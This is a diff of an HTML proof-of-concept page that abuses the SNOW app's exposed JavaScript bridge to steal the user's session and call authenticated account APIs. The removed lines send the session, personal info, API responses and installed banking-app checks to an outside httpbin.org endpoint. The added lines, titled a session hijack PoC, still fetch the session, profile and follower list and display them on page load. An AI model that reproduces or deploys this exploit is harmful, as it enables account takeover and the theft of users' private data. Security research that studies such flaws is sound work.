@@ -2,23 +2,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SNOW Filter Preview</title>
+    <title>SNOW PoC</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body{font-family:-apple-system,sans-serif;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;margin:0}
-        .container{max-width:500px;margin:0 auto;background:#fff;border-radius:20px;padding:20px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
-        h1{color:#333;text-align:center;font-size:18px}
-        .status{padding:8px 12px;margin:6px 0;background:#f8f9fa;border-radius:8px;font-size:10px;word-break:break-all}
-        .success{border-left:4px solid #4CAF50;background:#e8f5e9}
-        .error{border-left:4px solid #f44336;background:#ffebee}
-        .critical{border-left:4px solid #9c27b0;background:#f3e5f5}
-        pre{background:#263238;color:#aed581;padding:8px;border-radius:5px;font-size:8px;overflow-x:auto;max-height:150px;white-space:pre-wrap}
+        body{font-family:-apple-system,sans-serif;padding:10px;background:#1a1a2e;min-height:100vh;margin:0;color:#fff}
+        .container{max-width:500px;margin:0 auto}
+        h1{color:#00ff88;text-align:center;font-size:16px}
+        .status{padding:6px 10px;margin:4px 0;background:#16213e;border-radius:6px;font-size:9px;word-break:break-all}
+        .success{border-left:3px solid #00ff88}
+        .error{border-left:3px solid #ff6b6b}
+        .critical{border-left:3px solid #ff00ff;background:#2d1b3d}
+        pre{background:#0f0f23;color:#00ff88;padding:8px;border-radius:5px;font-size:8px;overflow-x:auto;max-height:200px;white-space:pre-wrap}
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔓 Exploiting SNOW...</h1>
+        <h1>🔓 SNOW Session Hijack PoC</h1>
         <div id="status"></div>
     </div>
 
@@ -27,7 +27,7 @@
 
     function log(msg, type) {
         var div = document.createElement('div');
-        div.className = 'status ' + (type || 'info');
+        div.className = 'status ' + (type || '');
         div.textContent = msg;
         document.getElementById('status').appendChild(div);
     }
@@ -38,123 +38,91 @@
         document.getElementById('status').appendChild(pre);
     }
 
-    function exfil(type, data) {
-        var img = new Image();
-        img.src = 'https://httpbin.org/anything/exfil?type=' + type + '&data=' + encodeURIComponent(JSON.stringify(data));
-    }
-
     function runExploit() {
         if (typeof B612KajiBridgeInterface === 'undefined') {
             log('Bridge NOT found', 'error');
             return;
         }
-
         Bridge = B612KajiBridgeInterface;
-        log('✅ B612KajiBridgeInterface FOUND!', 'success');
+        log('✅ Bridge FOUND!', 'success');
 
-        // 1. getUserSession - 세션/토큰 정보
+        // 1. getUserSession - 세션 정보 (가장 중요)
         window.sessionCB = function(data) {
             var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('🔑 USER SESSION Retrieved!', 'critical');
-            showData('Session', d);
-            exfil('session', d);
+            log('🔑 SESSION HIJACKED!', 'critical');
+            showData('Session Data', d);
         };
         try {
             Bridge.getUserSession('sessionCB');
-            log('Calling getUserSession...', 'info');
         } catch(e) {
-            log('getUserSession: ' + e, 'error');
+            log('getUserSession error: ' + e, 'error');
         }
 
-        // 2. appInfo - 앱 및 사용자 정보
-        window.appInfoCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('📱 APP INFO Retrieved!', 'success');
-            showData('AppInfo', d);
-            exfil('appInfo', d);
-        };
-        try {
-            Bridge.appInfo('appInfoCB');
-        } catch(e) {}
-
-        // 3. getPersonalInfo - 개인정보
-        window.personalCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('👤 PERSONAL INFO Retrieved!', 'critical');
-            showData('PersonalInfo', d);
-            exfil('personal', d);
-        };
-        try {
-            Bridge.getPersonalInfo('personalCB');
-        } catch(e) {}
-
-        // 4. apiRequest - 인증된 API로 사용자 프로필 탈취
-        window.profileCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('🎯 API RESPONSE (Profile)!', 'critical');
-            showData('API Profile', d);
-            exfil('apiProfile', d);
-        };
-        try {
-            Bridge.apiRequest('profileCB', JSON.stringify({
-                url: 'https://gw.snowcorp.com/api/v2/user/profile',
-                method: 'GET'
-            }));
-            log('Calling apiRequest for profile...', 'info');
-        } catch(e) {
-            log('apiRequest profile: ' + e, 'error');
-        }
-
-        // 5. 다른 API 엔드포인트 시도
+        // 2. apiRequest - 실제 사용자 API 호출 (올바른 엔드포인트)
         window.meCB = function(data) {
             var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('🎯 API RESPONSE (Me)!', 'critical');
-            showData('API Me', d);
-            exfil('apiMe', d);
+            log('🎯 /v1/user/me Response!', 'critical');
+            showData('User Me API', d);
         };
         try {
             Bridge.apiRequest('meCB', JSON.stringify({
-                url: 'https://gw.snowcorp.com/api/v2/me',
+                url: 'https://user-snow-api.snow.me/v1/user/me',
+                method: 'POST'
+            }));
+            log('Calling /v1/user/me...', '');
+        } catch(e) {
+            log('apiRequest me: ' + e, 'error');
+        }
+
+        // 3. 프로필 API
+        window.profileCB = function(data) {
+            var d = typeof data === 'string' ? JSON.parse(data) : data;
+            log('🎯 /v1/user/profile Response!', 'critical');
+            showData('User Profile API', d);
+        };
+        try {
+            Bridge.apiRequest('profileCB', JSON.stringify({
+                url: 'https://user-snow-api.snow.me/v1/user/profile',
+                method: 'POST'
+            }));
+        } catch(e) {}
+
+        // 4. 팔로워 목록 (개인정보)
+        window.followerCB = function(data) {
+            var d = typeof data === 'string' ? JSON.parse(data) : data;
+            log('👥 Follower List!', 'critical');
+            showData('Followers', d);
+        };
+        try {
+            Bridge.apiRequest('followerCB', JSON.stringify({
+                url: 'https://user-snow-api.snow.me/v1/user/follower/list',
+                method: 'POST',
+                parameters: {page: 1, size: 10}
+            }));
+        } catch(e) {}
+
+        // 5. 콘텐츠 API
+        window.contentCB = function(data) {
+            var d = typeof data === 'string' ? JSON.parse(data) : data;
+            log('📷 Content API Response!', 'success');
+            showData('Content', d);
+        };
+        try {
+            Bridge.apiRequest('contentCB', JSON.stringify({
+                url: 'https://content-snow-api.snow.me/v1/user/me',
                 method: 'GET'
             }));
         } catch(e) {}
 
-        // 6. readMeta - 저장된 메타데이터
-        window.metaCB = function(data) {
+        // 6. appInfo
+        window.appCB = function(data) {
             var d = typeof data === 'string' ? JSON.parse(data) : data;
-            log('📄 META DATA Retrieved!', 'success');
-            showData('MetaData', d);
-            exfil('meta', d);
+            log('📱 App Info', 'success');
+            showData('AppInfo', d);
         };
         try {
-            Bridge.readMeta('metaCB', JSON.stringify({key: 'user'}));
+            Bridge.appInfo('appCB');
         } catch(e) {}
-
-        // 7. 설치된 금융앱 체크 (프라이버시 침해)
-        var bankApps = [];
-        window.bankCB = function(data) {
-            var d = typeof data === 'string' ? JSON.parse(data) : data;
-            if (d && d.installed) {
-                bankApps.push(d.package || d);
-                log('💳 Bank App Found: ' + JSON.stringify(d), 'critical');
-            }
-            exfil('bankApp', d);
-        };
-        var apps = [
-            'com.kakaobank.channel',
-            'com.kbstar.kbbank',
-            'com.shinhan.sbanking',
-            'com.wooribank.smart.npib',
-            'com.toss.supertoss',
-            'com.nhn.android.search',
-            'com.kakao.talk'
-        ];
-        apps.forEach(function(pkg) {
-            try {
-                Bridge.checkAppInstalled('bankCB', JSON.stringify({package: pkg}));
-            } catch(e) {}
-        });
-        log('Checking ' + apps.length + ' sensitive apps...', 'info');
     }
 
     setTimeout(runExploit, 500);
